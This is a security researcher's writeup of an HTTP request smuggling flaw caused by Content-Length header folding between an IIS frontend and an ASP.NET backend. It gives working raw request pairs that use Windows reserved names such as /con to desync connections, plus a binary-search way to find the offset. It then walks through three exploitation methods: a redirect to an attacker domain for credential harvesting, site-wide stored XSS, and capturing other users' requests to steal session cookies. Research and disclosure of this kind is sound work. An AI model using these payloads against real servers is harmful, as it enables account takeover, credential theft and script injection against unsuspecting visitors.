---
title: HTTP Request Smuggling via Content-Length Folding
parent: Writeups
nav_order: 1
tags: [http-smuggling, desync, iis, aspnet]
---

# HTTP Request Smuggling via Content-Length Header Folding
{: .no_toc }

**Severity:** High, CVSS 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H)  
**Vulnerability Class:** CWE-444 (Inconsistent Interpretation of HTTP Requests)  
**Impact:** Account takeover, credential harvesting via open redirect, site-wide stored XSS  
**Relevant resources:** [http1 must die](https://portswigger.net/research/http1-must-die), [Windows docs](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)


## Table of Contents
{: .no_toc .text-delta }

1. TOC
{:toc}

## Summary
A HTTP desynchronization vulnerability allowed attackers to hijack other users's connection to the company's website, making it possible to redirect users to malicious pages, deliver an XSS payload on any page load from other users, or potentially conduct a mass 0-click account takeover

## Vulnerability Details
This website  used IIS as a gateway with an ASP.NET backend, which display different behaviours when encountering the header `Content-Length: \r\nx`.  

In particular, based on my testing, it seems that the IIS frontend was just disregarding the header, still forwarding it, while the backend treated it as a legitimate length.  

To exploit this difference, what is called an "Early Return Gadget" is needed, that is, some way of making the frontend respond to our request without waiting for the backend response.  
In this case, this is achieved by making a request for any of the paths 

`CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, COM¹, COM², COM³, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, LPT9, LPT¹, LPT² e LPT³`

It seems in Windows these names are reserved for referencing the DOS command line, and opening them throws an error.

Exploitability is confirmed by sending the two requests

```
POST /con HTTP/1.1
Host: host
Content-Length:
 20

```

and

```
GET / HTTP/1.1
X: YGET /static/resource HTTP/1.1
Host: host

```

in sequence down the same connection between the client and the frontend.  

If the response to the second request has the contents of `/static/resource` instead of the root directory, we have confirmed that the first 20 bytes of the second request have been treated by the backend server as body for the first, and thus that the behaviour can be exploited.

This process may fail because there is a race condition involved: for it to work these two requests must also end up in the same connection between the frontend and the backend, which is not guaranteed. I found that, on average, 1 out of every 4 attempts resulted in a success.

<br>

## Finding the offset
Ideally at this point we would be able to exploit other users via the following:

- Send the poisoning request

    ```
    POST /con HTTP/1.1
    Host: host
    Content-Length:
     X
    ```
- Down the same connection send a second request in which the content-length is the first header, and which body is the request smuggling payload (the prefix that will be prepended to the victim's request)

    ```
    GET / HTTP/1.1
    Content-Length: Y
    A: BGET /static/resource HTTP/1.1
    Host: host

    GET / HTTP/1.1
    A: B
    ```

- Repeat until the response to the second request contains the contents of `/static/resource`

where X is the number of bytes we want the backend to ignore from the beginning of the second request, Y is the length of the smuggling payload.

This failed, every time the race condition was successful, the response was `HTTP 400: Invalid Verb`.

After a while I realized that the IIS frontend was rewriting the content-length header as the last header, causing the HTTP verb perceived by the backend to be nonsensical.

At this point the only way left is to try to infer the length of the second request after the frontend rewrite, and cut it off entirely. I've done so by adopting a binary search approach, starting from a 1000 bytes offset:

- Send POST request to `/con` with `Content-Length:\r\n1000`
- Send normal request
- If the second request hangs it means the offset was too large, causing the backend to wait for all promised bytes. If it fails with `Invalid verb` it means the request was cut in the middle.
- Update the offset accordingly and repeat

Eventually I found the offset to be around 836.

## Exploiting Users
### Method 1: Universal redirect for credential harvesting
The website had a login. A possible attack scenario is:

- Smuggle the following payload

    ```
    GET https://attacker-domain.com/static HTTP/1.1
    X: Y
    ```

    As is common with many webservers, requesting a directory without the terminal slash causes a redirection to the same directory with the terminal slash included, but the url it redirects to is built using the `Host` header or an absolute URL if provided
- The victim is now redirected to attacker-domain.com, which will host a copy of the login mechanism hosted on the website. 
- An unknowing victim which has simply navigated to a legitimate site is likely to believe the fake login to be legitimate and input their credentials

### Method 2: Site-wide stored XSS
By sending the following pair of requests, the frontend can be induced to over-read
from the TCP connection: it believes it is serving the response to a
`GET` request, while the backend actually responded to a `HEAD` request.
The response *headers* of that HEAD response are then served as the
*body* to the victim — meaning a payload placed in a `Location` header
gets rendered and executed as HTML in the victim's browser.

**Request 1:**
```
POST /con HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Accept: */*
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 
 836
```

**Request 2:**
```
GET / HTTP/1.1
Host: host
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive
Content-Length: <length of the two GET/HEAD requests below, in bytes>

GET / HTTP/1.1
Host: host
Connection: keep-alive

HEAD / HTTP/1.1
Host: host
Connection: keep-alive

GET /directory-to-cause-302?<script>SCRIPT</script> HTTP/1.1
X: Y
```

### Method 3: Mass 0-click Account Takeover
Although I was not able to verify this as this was unauthenticated testing, it is very likely that an authenticated attacker can leverage this vulnerability to steal Authorization tokens or session cookies from random users.

The site had a couple of functionalities to create files or otherwise textual resources. These could have been used to log victims requests into the attacker account by smuggling

```
POST /endpoint-to-create-files HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Content-Length: 1000

target_param=
```
